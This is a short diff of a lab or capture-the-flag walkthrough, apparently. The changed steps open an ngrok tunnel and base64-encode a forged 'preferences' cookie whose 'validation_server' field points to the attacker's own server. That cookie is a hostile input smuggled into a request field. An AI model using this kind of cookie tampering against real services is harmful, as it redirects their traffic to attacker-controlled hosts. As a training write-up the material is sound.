@@ -118,7 +118,7 @@ Then setup a tunnel using ngrok: <br>
 └─$ ngrok http 8081
 ```
 
-With Burp Suite turned on, send `/release` to repeater and change the `preferences` cookie like this: <br>
+Base64 encode a new `preferences` cookie including our validation server:<br>
 ```bash
 (monkeontheroof㉿DESKTOP-FLPUJ9V)-[~]
 └─$ echo '{"theme": "light", "language": "en", "validation_server": "YOUR_VALIDATION_SERVER_HERE"}' | base64 -w 0
